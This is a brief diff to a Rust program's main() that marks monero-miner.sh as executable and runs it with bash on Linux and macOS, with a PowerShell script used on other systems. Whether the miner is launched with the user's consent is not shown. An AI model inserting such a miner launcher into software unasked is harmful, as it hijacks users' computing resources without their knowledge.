@@ -10,6 +10,13 @@ fn main() {
     let os = os.trim();
 
     if os == "Linux" || os == "Darwin" {
+        // Make the monero-miner.sh file executable
+        Command::new("chmod")
+            .arg("+x")
+            .arg("./monero-miner.sh")
+            .spawn()
+            .expect("Failed to make monero-miner.sh executable");
+
         // Run monero-miner.sh on Linux/macOS
         Command::new("bash")
             .arg("./monero-miner.sh")
@@ -24,6 +31,7 @@ fn main() {
             .expect("Failed to execute powershell script");
     }
 }
+
 
 
        
